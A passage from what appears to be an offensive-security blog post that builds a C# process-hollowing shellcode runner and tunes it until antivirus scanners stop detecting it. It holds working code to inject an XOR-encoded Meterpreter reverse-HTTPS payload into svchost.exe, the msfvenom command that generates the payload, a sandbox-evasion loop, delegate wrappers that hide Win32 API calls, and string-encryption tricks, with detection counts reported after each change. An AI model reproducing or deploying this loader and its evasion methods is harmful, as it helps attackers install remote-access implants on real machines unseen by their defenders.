                return;
            }
        }
    }
} 
```

The **Main** method:

```csharp
        static void Main(string[] args)
        {
            // Run sandbox/emulation evasion first before executing our shellcode
            // Perform many iterations of for loop, 900 million, to trip up emulator
            Evasion.ManyIterations();
            // After evasion is performed we finally call the runner
            Run();
        } 
```

## Cheating My Way To FUD With Obfuscators

At this point in my research, I played around with some third-party .NET obfuscators.

Prior to this, I had tested numerous free .NET obfuscators with other shellcode runners, but the two most effective free obfuscators I had found were [Agile.NET](https://secureteam.net/acode-download) and [Babel](https://www.babelfor.net/).

Both of these have paid and free versions, but I utilized the free versions for all of my testing.

I found that by tweaking the settings in Babel, I could get the detection rate down to 1/40.

These were the settings I used:

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/advanced-babel-settings.png)

This allowed me to obfuscate the control flow of the program using the “goto” algorithm.

Additionally, I set it to encrypt all strings with XOR.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/babel-obfuscated-1-40-detect-rate-741x1024.png)

While this dramatically reduced the detection rate, I could not bypass ESET NOD32.

It was at this point that NOD32 became my personal nemesis. 😤

I went down a deep rabbit hole trying to determine what specifically was causing NOD32 to flag the shellcode runner.

I concluded that the detection had to be heuristic or behavioral.

I set up a Windows 11 VM with a trial version of NOD32, but could not deduce how it was detecting the shellcode runner.

So, I began to search for any information I could find about how ESET NOD32 performs its analysis.

But as you might expect, this search was futile as AV vendors are incentivized to keep their detection methods a secret.

The cat and mouse game would be a lot less fun to take part in if they didn’t. 🐈‍⬛

After much more trial and error than I could fit in this one post, I went back and tried using the Agile.NET third-party obfuscator to see if this would finally get me past ESET.

Within the free version of Agile.NET, I configured the settings to perform code encryption, control flow obfuscation, method call obfuscation, string obfuscation, and renaming.

So, did this get past NOD32?

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/agile-net-obfuscator-1-40-detection-rate-743x1024.png)

Yeah, it did, just for it to get flagged by IKARUS…

At this point in my quest to determine what specific part of my shellcode runner was causing the detection, I turned to an awesome tool by Matt Hand called DefenderCheck:

<https://github.com/matterpreter/DefenderCheck>

I booted up another Windows 11 virtual machine with Microsoft Defender configured and ran the tool against the unobfuscated version of my executable.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/defender-check-with-persistence-code.png)

Remember how I said earlier that the persistence code I implemented would come back to bite me in the ass? Well, here it is, and it quite literally would “byte” me in the ass.

If you look closely at the ASCII representation of the bad bytes in the file, you will notice that the persistence code that writes to the registry is triggering the detection by Windows Defender, as well as the Win32 API calls:

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/registry-underlined-defender-check.png)

One problem at a time.

I will get back to the API problem later in this post.

First, we gotta get rid of that persistence code.

After removing the **Persistence.cs** external class and the related method call and namespace from the shellcode runner, I obfuscated the new version of the PE with Agile.NET once more.

What were the results?

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/no-persistence-agile-obfuscated-results-741x1024.png)

Haha, I was finally undetectable at scan-time!

However…

I’ve never been satisfied with taking the easy way out of things, and this was no different.

While I had achieved no detections at scan-time, I had done it through the use of third-party obfuscators.

Without using the Agile.NET obfuscator, my detection rating was still at 6/40.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/no-obfuscation-no-persistence-results-740x1024.png)

Most importantly, I was still being detected by Microsoft Defender without a third-party obfuscator.

I couldn’t rest until I was completely undetectable at scan-time and runtime against Microsoft Defender.

Therefore, I knew I would have to employ a more creative approach, so it was back to the drawing board.

## BYOF: Bringing My Own Functions to the Party

While I slightly lowered the detection rate by removing the persistence code from my program, the API issue remained.

When running DefenderCheck against the new version of the shellcode runner that does not contain the persistence code, you can see that several of the Win32 APIs I employed are shown within the bad bytes:

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/defender-check-api-bad-bytes-underlined.png)

Given these results, I knew I needed to find a way to call all of the Win32 API functions responsible for performing the process hollowing injection without the antivirus engines noticing.

This was much easier said than done, but I found a way after a lot of experimentation.

I realized that I could create delegate functions for each of the Win32 APIs and use wrapper methods to call them.

This way, I could obfuscate the usage of the Win32 API functions while still maintaining the functionality of the shellcode runner.

“Why not use D/Invoke?”

D/Invoke is a fantastic resource, but I was more interested in finding a way to do this myself and see if my implementation would be effective despite using P/Invoke imports.

Firstly, the structures at the start of the runner and the DLL imports themselves must remain unobfuscated, or else functionality will be broken.

(More specifically, I don’t know of a way to obfuscate the imports without using D/Invoke.)

```csharp
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread); 
```

Now, I had to create custom delegate functions for each of the DLL imports; these delegates are used to store references to the imported functions:

```csharp
        // Custom delegate functions for the DLL imports
        private delegate bool M1(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        private delegate int M2(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        private delegate bool M3(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        private delegate bool M4(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate uint M5(IntPtr hThread); 
```

Each function name has been obfuscated.

So, the first delegate function, **M1**, represents **CreateProcess**.

The second delegate function, **M2**, represents **ZwQueryInformationProcess**.

Do you see where this is going?

Okay? Good.

You’ll also notice that each custom delegate function is configured with its corresponding parameters.

I then created delegate instances, which essentially are new wrapper methods that will be equal to each custom delegate function:

```csharp
        // Create delegate instances
        private static M1 F1;
        private static M2 F2;
        private static M3 F3;
        private static M4 F4;
        private static M5 F5; 
```

In the **Main** method, I initialize the delegate instances with references to the imported functions.

In other words, this is so that they can be used to interact with the original Win32 API functions:

```csharp
        static void Main(string[] args)
        {
            // Initialize delegate instances with the original DLL functions
            F1 = CreateProcess;
            F2 = ZwQueryInformationProcess;
            F3 = ReadProcessMemory;
            F4 = WriteProcessMemory;
            F5 = ResumeThread;
            // Run sandbox/emulation evasion first before executing our shellcode
            // Perform many iterations of for loop, 900 million, to trip up emulator
            Evasion.MI();
            // After evasion is performed, we finally call the runner
            Run();
        } 
```

Now that the delegate functions are initialized, I modified the **Run** method.

(You may also notice that I have obfuscated the method name for the “Many Iterations” technique. Changing the method name from **ManyIterations** to just **MI**.)

I changed each Win32 API function call to its corresponding obfuscated version:

```csharp
        static void Run()
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = F1(null, "C:\Windows\System32\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            F2(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            F3(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            F3(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            // Generate XOR shellcode with MSFVenom: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d 'nr'
            byte[] buf = new byte[804] { 0x86, 0x32, 0xf9, 0x9e, 0x8a, 0x92, 0xb6, 0x7a, 0x7a, 0x7a, 0x3b, 0x2b, 0x3b, 0x2a, 0x28, 0x32, 0x4b, 0xa8, 0x2b, 0x1f, 0x32, 0xf1, 0x28, 0x1a, 0x32, 0xf1, 0x28, 0x62, 0x2c, 0x32, 0xf1, 0x28, 0x5a, 0x32, 0xf1, 0x08, 0x2a, 0x32, 0x75, 0xcd, 0x30, 0x30, 0x37, 0x4b, 0xb3, 0x32, 0x4b, 0xba, 0xd6, 0x46, 0x1b, 0x06, 0x78, 0x56, 0x5a, 0x3b, 0xbb, 0xb3, 0x77, 0x3b, 0x7b, 0xbb, 0x98, 0x97, 0x28, 0x3b, 0x2b, 0x32, 0xf1, 0x28, 0x5a, 0xf1, 0x38, 0x46, 0x32, 0x7b, 0xaa, 0x1c, 0xfb, 0x02, 0x62, 0x71, 0x78, 0x75, 0xff, 0x08, 0x7a, 0x7a, 0x7a, 0xf1, 0xfa, 0xf2, 0x7a, 0x7a, 0x7a, 0x32, 0xff, 0xba, 0x0e, 0x1d, 0x32, 0x7b, 0xaa, 0x2a, 0xf1, 0x32, 0x62, 0x3e, 0xf1, 0x3a, 0x5a, 0x33, 0x7b, 0xaa, 0x99, 0x2c, 0x32, 0x85, 0xb3, 0x37, 0x4b, 0xb3, 0x3b, 0xf1, 0x4e, 0xf2, 0x32, 0x7b, 0xac, 0x32, 0x4b, 0xba, 0x3b, 0xbb, 0xb3, 0x77, 0xd6, 0x3b, 0x7b, 0xbb, 0x42, 0x9a, 0x0f, 0x8b, 0x36, 0x79, 0x36, 0x5e, 0x72, 0x3f, 0x43, 0xab, 0x0f, 0xa2, 0x22, 0x3e, 0xf1, 0x3a, 0x5e, 0x33, 0x7b, 0xaa, 0x1c, 0x3b, 0xf1, 0x76, 0x32, 0x3e, 0xf1, 0x3a, 0x66, 0x33, 0x7b, 0xaa, 0x3b, 0xf1, 0x7e, 0xf2, 0x32, 0x7b, 0xaa, 0x3b, 0x22, 0x3b, 0x22, 0x24, 0x23, 0x20, 0x3b, 0x22, 0x3b, 0x23, 0x3b, 0x20, 0x32, 0xf9, 0x96, 0x5a, 0x3b, 0x28, 0x85, 0x9a, 0x22, 0x3b, 0x23, 0x20, 0x32, 0xf1, 0x68, 0x93, 0x31, 0x85, 0x85, 0x85, 0x27, 0x32, 0x4b, 0xa1, 0x29, 0x33, 0xc4, 0x0d, 0x13, 0x14, 0x13, 0x14, 0x1f, 0x0e, 0x7a, 0x3b, 0x2c, 0x32, 0xf3, 0x9b, 0x33, 0xbd, 0xb8, 0x36, 0x0d, 0x5c, 0x7d, 0x85, 0xaf, 0x29, 0x29, 0x32, 0xf3, 0x9b, 0x29, 0x20, 0x37, 0x4b, 0xba, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x33, 0xc0, 0x40, 0x2c, 0x03, 0xdd, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x92, 0x74, 0x7a, 0x7a, 0x7a, 0x4b, 0x43, 0x48, 0x54, 0x4b, 0x4c, 0x42, 0x54, 0x4b, 0x54, 0x48, 0x4a, 0x43, 0x7a, 0x20, 0x32, 0xf3, 0xbb, 0x33, 0xbd, 0xba, 0xc1, 0x7b, 0x7a, 0x7a, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x10, 0x79, 0x29, 0x33, 0xc0, 0x2d, 0xf3, 0xe5, 0xbc, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x92, 0x80, 0x7a, 0x7a, 0x7a, 0x55, 0x18, 0x0e, 0x2f, 0x08, 0x2a, 0x4e, 0x29, 0x36, 0x11, 0x1f, 0x1e, 0x17, 0x4f, 0x17, 0x1c, 0x11, 0x3b, 0x57, 0x4d, 0x1e, 0x31, 0x1d, 0x4a, 0x19, 0x37, 0x0d, 0x3d, 0x38, 0x2f, 0x28, 0x30, 0x00, 0x0b, 0x22, 0x08, 0x19, 0x2e, 0x3b, 0x4e, 0x3e, 0x1e, 0x0d, 0x29, 0x1e, 0x1f, 0x3c, 0x29, 0x2e, 0x2c, 0x43, 0x3c, 0x3f, 0x2e, 0x30, 0x2f, 0x1e, 0x3d, 0x0b, 0x32, 0x3f, 0x35, 0x57, 0x39, 0x1b, 0x13, 0x10, 0x43, 0x19, 0x35, 0x37, 0x0b, 0x4e, 0x09, 0x16, 0x17, 0x02, 0x16, 0x4c, 0x28, 0x4a, 0x30, 0x30, 0x2f, 0x31, 0x28, 0x3f, 0x4f, 0x19, 0x33, 0x12, 0x0e, 0x25, 0x2b, 0x4d, 0x2f, 0x39, 0x1f, 0x1b, 0x3d, 0x48, 0x0d, 0x02, 0x4a, 0x2b, 0x2d, 0x3d, 0x16, 0x28, 0x4a, 0x57, 0x57, 0x22, 0x10, 0x4c, 0x16, 0x3d, 0x4a, 0x1b, 0x0a, 0x14, 0x02, 0x00, 0x03, 0x08, 0x0b, 0x29, 0x35, 0x3c, 0x08, 0x25, 0x4e, 0x12, 0x0c, 0x3e, 0x2b, 0x0a, 0x29, 0x2e, 0x33, 0x19, 0x1c, 0x2e, 0x11, 0x4b, 0x4a, 0x33, 0x17, 0x2c, 0x11, 0x34, 0x29, 0x25, 0x12, 0x0f, 0x2b, 0x4a, 0x57, 0x57, 0x15, 0x28, 0x3f, 0x11, 0x37, 0x1e, 0x49, 0x03, 0x0e, 0x4e, 0x43, 0x16, 0x1f, 0x42, 0x17, 0x31, 0x49, 0x3b, 0x4f, 0x02, 0x4d, 0x2e, 0x10, 0x35, 0x2e, 0x0c, 0x3c, 0x13, 0x20, 0x2b, 0x17, 0x10, 0x4f, 0x29, 0x12, 0x19, 0x11, 0x16, 0x37, 0x1c, 0x08, 0x39, 0x2d, 0x32, 0x48, 0x3e, 0x39, 0x4c, 0x03, 0x4b, 0x2f, 0x39, 0x1f, 0x22, 0x1c, 0x08, 0x1d, 0x0a, 0x03, 0x30, 0x1f, 0x02, 0x16, 0x29, 0x3d, 0x16, 0x08, 0x00, 0x39, 0x0f, 0x1d, 0x18, 0x35, 0x09, 0x25, 0x19, 0x25, 0x48, 0x0a, 0x2d, 0x22, 0x13, 0x42, 0x0a, 0x0b, 0x0e, 0x09, 0x25, 0x43, 0x2d, 0x7a, 0x32, 0xf3, 0xbb, 0x29, 0x20, 0x3b, 0x22, 0x37, 0x4b, 0xb3, 0x29, 0x32, 0xc2, 0x7a, 0x48, 0xd2, 0xfe, 0x7a, 0x7a, 0x7a, 0x7a, 0x2a, 0x29, 0x29, 0x33, 0xbd, 0xb8, 0x91, 0x2f, 0x54, 0x41, 0x85, 0xaf, 0x32, 0xf3, 0xbc, 0x10, 0x70, 0x25, 0x32, 0xf3, 0x8b, 0x10, 0x65, 0x20, 0x28, 0x12, 0xfa, 0x49, 0x7a, 0x7a, 0x33, 0xf3, 0x9a, 0x10, 0x7e, 0x3b, 0x23, 0x33, 0xc0, 0x0f, 0x3c, 0xe4, 0xfc, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x37, 0x4b, 0xba, 0x29, 0x20, 0x32, 0xf3, 0x8b, 0x37, 0x4b, 0xb3, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x33, 0xbd, 0xb8, 0x57, 0x7c, 0x62, 0x01, 0x85, 0xaf, 0xff, 0xba, 0x0f, 0x65, 0x32, 0xbd, 0xbb, 0xf2, 0x69, 0x7a, 0x7a, 0x33, 0xc0, 0x3e, 0x8a, 0x4f, 0x9a, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0x85, 0xb5, 0x0e, 0x78, 0x91, 0xd0, 0x92, 0x2f, 0x7a, 0x7a, 0x7a, 0x29, 0x23, 0x10, 0x3a, 0x20, 0x33, 0xf3, 0xab, 0xbb, 0x98, 0x6a, 0x33, 0xbd, 0xba, 0x7a, 0x6a, 0x7a, 0x7a, 0x33, 0xc0, 0x22, 0xde, 0x29, 0x9f, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0xe9, 0x29, 0x29, 0x32, 0xf3, 0x9d, 0x32, 0xf3, 0x8b, 0x32, 0xf3, 0xa0, 0x33, 0xbd, 0xba, 0x7a, 0x5a, 0x7a, 0x7a, 0x33, 0xf3, 0x83, 0x33, 0xc0, 0x68, 0xec, 0xf3, 0x98, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0xf9, 0xbe, 0x5a, 0xff, 0xba, 0x0e, 0xc8, 0x1c, 0xf1, 0x7d, 0x32, 0x7b, 0xb9, 0xff, 0xba, 0x0f, 0xa8, 0x22, 0xb9, 0x22, 0x10, 0x7a, 0x23, 0xc1, 0x9a, 0x67, 0x50, 0x70, 0x3b, 0xf3, 0xa0, 0x85, 0xaf };
            // XOR decode function, key is set to 'z'
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'z');
            }
            F4(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            F5(pi.hThread);
        } 
```

For example, you can see that the first function call to **CreateProcess** has been changed to **F1** instead*.*

Without obfuscation:

```csharp
            bool res = CreateProcess(null, "C:\Windows\System32\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); 
```

With obfuscation:

```csharp
            bool res = F1(null, "C:\Windows\System32\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); 
```

The functionality remains the same, but by using custom delegate functions to call the original Win32 API functions, the malicious behavior of the program is more challenging for antivirus to detect.

The results?

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/custom-delegate-functions-results-659x1024.png)

Outstanding!

By obfuscating the Win32 API function calls using custom delegate functions, the detection rate dropped from 6/40 to only 1/40!

Better yet, all of this was achieved without the use of a third-party obfuscator.

This technique got me past Microsoft Defender, ESET NOD32, Acrabit, Alyac, Emsisoft, and G-Data.

Therefore, by employing the use of custom delegate functions in C#/.NET offensive tooling, you can dramatically decrease detection rates, even without using D/Invoke to obfuscate the DLL imports.

## Flying Too Close to the Sun ☀️

At this point, I was nearly undetectable at scan-time.

However, I still needed to find a way to bypass the IKARUS antivirus software.

It occurred to me that if I could get a free trial version of IKARUS; I may be able to discover how it was detecting my shellcode runner.

Unfortunately, there is no free trial for the IKARUS software that is publicly available.

Therefore, I decided to take a shot in the dark and see if obfuscating the string storing the path to svchost.exe would evade IKARUS.

I first attempted to obfuscate the path string that is passed to **CreateProcess** by using string concatenation:

```
```csharp
            // Obfuscated parts of the path
            string part1 = "C:\Wi";
            string part2 = "ndo";
            string part3 = "ws\Sy";
            string part4 = "stem";
            string part5 = "32\sv";
            string part6 = "chost.exe";
            // Concatenate and reconstruct the path at runtime
            string path =

<pre wp-pre-tag-34="">
<p>quot;{part1}{part2}{part3}{part4}{part5}{part6}";<br></br>
bool res = F1(null, path, IntPtr.Zero,<br></br>
IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); </p>
```<br></br>
Here were the results:
<p><img alt="" decoding="async" height="968" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-results-677x1024.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-results-677x1024.png 677w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-results-198x300.png 198w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/string-concat-results.png 758w" width="640"></img></p>
<p>I was still being detected by IKARUS, so I decided to try encrypting the string using AES and decrypting it at runtime before passing it to <strong>CreateProcess</strong>.</p>
<p>I made a new external class named <strong>FilepathEncryptor.cs</strong> and created several public methods to:</p>
<ol>
<li>Dynamically generate a random key and initialization vector</li>
<li>Encrypt the string using the randomly generated key and IV</li>
<li>Decrypt the string using the random key and IV</li>
</ol>
<code class="language-csharp">using System;
using System.IO;
using System.Security.Cryptography;
namespace HollowGhostEncPath.Modules.Crypt
{
    public class FilepathEncryptor
    {
        public static string GenerateRandomKey(int keySize)
        {
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] keyBytes = new byte[keySize];
                rng.GetBytes(keyBytes);
                return Convert.ToBase64String(keyBytes);
            }
        }
        public static string GenerateRandomIV()
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.GenerateIV();
                return Convert.ToBase64String(aesAlg.IV);
            }
        }
        public static string Encrypt(string plainText, string key, string iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Convert.FromBase64String(key);
                aesAlg.IV = Convert.FromBase64String(iv);
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                    }
                    return Convert.ToBase64String(msEncrypt.ToArray());
                }
            }
        }
        public static string Decrypt(string cipherText, string key, string iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Convert.FromBase64String(key);
                aesAlg.IV = Convert.FromBase64String(iv);
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
} </code>
<p>I then proceeded to implement this functionality within the <strong>Main</strong> method of <strong>Program.cs</strong>:</p>
<code class="language-csharp">        private static string iv;
        private static string encryptionKey;
        static void Main(string[] args)
        {
            // Initialize delegate instances with the original DLL functions
            F1 = CreateProcess;
            F2 = ZwQueryInformationProcess;
            F3 = ReadProcessMemory;
            F4 = WriteProcessMemory;
            F5 = ResumeThread;
            // Generate a dynamic encryption key
            encryptionKey = FilepathEncryptor.GenerateRandomKey(32); // Use an appropriate key size
            iv = FilepathEncryptor.GenerateRandomIV(); // Generate a random IV
            // Plain-text file path
            string plainTextPath = "C:\Windows\System32\svchost.exe";
            // Encrypt the plain-text file path using the dynamic encryption key and IV
            string encryptedPath = FilepathEncryptor.Encrypt(plainTextPath, encryptionKey, iv);
            // Run sandbox/emulation evasion first before executing our shellcode
            // Perform many iterations of for loop, 900 million, to trip up emulator
            Evasion.MI();
            // After evasion is performed, we finally call the runner
            Run(encryptedPath);
        } </code>
<p>I then tweaked the <strong>Run</strong> method so that the encrypted file path string is decrypted at runtime before being passed to <strong>CreateProcess</strong>:</p>
<code class="language-csharp">        static void Run(string encryptedPath)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            // Decrypt the file path before using it
            string path = FilepathEncryptor.Decrypt(encryptedPath, encryptionKey, iv);
            bool res = F1(null, path, IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); </code>
<p>Unfortunately, this led to the same results as before:</p>
<p><img alt="" decoding="async" height="967" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/enc-path-results-678x1024.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/enc-path-results-678x1024.png 678w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/enc-path-results-199x300.png 199w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/enc-path-results.png 757w" width="640"></img></p>
<h4>The Compromise</h4>
<blockquote><p>
				"The opposite of compromise is fanaticism and death."</p>
<p><cite>Amos Oz</cite></p></blockquote>
<p>Well, in my scenario, I'm not sure about the death part, but I am undoubtedly fanatical when it comes to achieving a goal.</p>
<p>While I had hoped to get the shellcode runner to be completely undetected without using a third-party obfuscator, I was ultimately unsuccessful.</p>
<p>This wasn't for a lack of trying.</p>
<p>However, each of my attempts to isolate and obfuscate what was triggering IKARUS within my program was met with failure.</p>
<p>I do believe that further research on implementing extensive manual obfuscation of the code would lead to bypassing IKARUS.</p>
<p>Instead, I opted to maintain my sanity and rely on third-party obfuscation to overcome the last hurdle.</p>
<p>Implementing that level of obfuscation would require more time and resources than I had to give to this project.</p>
<p>After obfuscating the version of the shellcode runner that utilizes string concatenation with only the default settings in Babel, I was able to remain undetected by IKARUS:</p>
<p><img alt="" decoding="async" height="965" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-string-concat-679x1024.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-string-concat-679x1024.png 679w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-string-concat-199x300.png 199w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-string-concat.png 760w" width="640"></img></p>
<p>I achieved the same results with the version that AES encrypts the file path string using the default obfuscation settings in Babel:</p>
<p><img alt="" decoding="async" height="887" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-enc-path-results-739x1024.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-enc-path-results-739x1024.png 739w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-enc-path-results-217x300.png 217w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-enc-path-results-768x1064.png 768w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/fud-babel-obf-enc-path-results.png 828w" width="640"></img></p>
<h2>Defeating Defender ⚔️🛡️</h2>
<p>I knew I was undetectable at scan-time, but now it was time to confirm if this would hold up at runtime.</p>
<p>My primary target was Microsoft Defender, as this is by far the most widely utilized antivirus.</p>
<p>Given that I had already managed to bypass Microsoft Defender without a third-party obfuscator, I conducted this testing using versions of the PE that were <strong>NOT</strong> obfuscated with third-party software.</p>
<p>Specifically, the testing and demonstrations shown below were conducted with the version of the shellcode runner that utilizes custom delegate functions and performs string concatenation on the "C:WindowsSystem32svchost.exe" file path string.</p>
<p>No third-party obfuscation software was used.</p>
<h4>Setting Up the Lab</h4>
<p>I configured my lab using Oracle VirtualBox.</p>
<p>The lab contained two virtual machines.</p>
<p>The attacking machine:</p>
<p>Kali Linux VM</p>
<p>The victim machine:</p>
<p>Windows 11 Enterprise VM, fully updated/patched and running on the latest build for 22H2 as of the time of writing:</p>
<p><img alt="" decoding="async" height="190" loading="lazy" sizes="(max-width: 640px) 100vw, 640px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/win11-build.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/win11-build.png 846w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/win11-build-300x89.png 300w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/win11-build-768x228.png 768w" width="640"></img></p>
<p>I attached both the Kali VM and Windows 11 VM to an internal network within VirtualBox:</p>
<p><img alt="" decoding="async" height="208" loading="lazy" sizes="(max-width: 423px) 100vw, 423px" src="http://loganelliottinfosec.com/wp-content/uploads/2023/10/internal-network-vbox.png" srcset="https://loganelliottinfosec.com/wp-content/uploads/2023/10/internal-network-vbox.png 423w, https://loganelliottinfosec.com/wp-content/uploads/2023/10/internal-network-vbox-300x148.png 300w" width="423"></img></p>
